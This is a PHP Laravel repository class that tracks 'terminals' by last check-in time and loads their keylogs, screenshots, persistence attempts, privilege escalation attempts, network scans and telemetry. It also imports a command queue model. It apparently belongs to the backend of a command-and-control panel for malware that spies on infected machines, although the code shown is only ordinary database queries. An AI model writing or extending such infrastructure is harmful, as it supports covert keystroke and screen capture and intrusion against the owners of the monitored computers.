<?php

namespace App\Repositories;

use App\Models\Terminal;
use App\Models\CommandQueue;
use Illuminate\Support\Collection;

class TerminalRepository
{
    /**
     * Update or create terminal
     */
    public function updateOrCreate(string $id, array $data): Terminal
    {
        $terminal = Terminal::find($id);
        
        if ($terminal) {
            $terminal->update(array_merge($data, [
                'last_seen_at' => now(),
            ]));
        } else {
            $terminal = Terminal::create(array_merge($data, [
                'id' => $id,
                'first_seen_at' => now(),
                'last_seen_at' => now(),
            ]));
        }
        
        return $terminal;
    }
    
    /**
     * Get all terminals with online status
     */
    public function getAllWithStatus(): Collection
    {
        return Terminal::all()->map(function ($terminal) {
            $terminal->is_online = $terminal->is_online;
            return $terminal;
        });
    }
    
    /**
     * Get online terminals only
     */
    public function getOnline(): Collection
    {
        return Terminal::where('last_seen_at', '>=', now()->subMinutes(5))->get();
    }
    
    /**
     * Get terminal with all related data
     */
    public function getWithRelations(string $id): ?Terminal
    {
        return Terminal::with([
            'keylogs' => fn($q) => $q->latest('captured_at')->limit(100),
            'screenshots' => fn($q) => $q->latest('captured_at')->limit(20),
            'persistenceAttempts' => fn($q) => $q->latest('attempted_at')->limit(50),
            'privilegeEscalationAttempts' => fn($q) => $q->latest('attempted_at')->limit(50),
            'networkScans' => fn($q) => $q->latest('started_at')->limit(10),
            'telemetryLogs' => fn($q) => $q->latest('logged_at')->limit(100),
        ])->find($id);
    }
    
    /**
     * Cleanup old terminals (not seen in 30 days)
     */
    public function cleanup(): int
    {
        return Terminal::where('last_seen_at', '<', now()->subDays(30))->delete();
    }
}
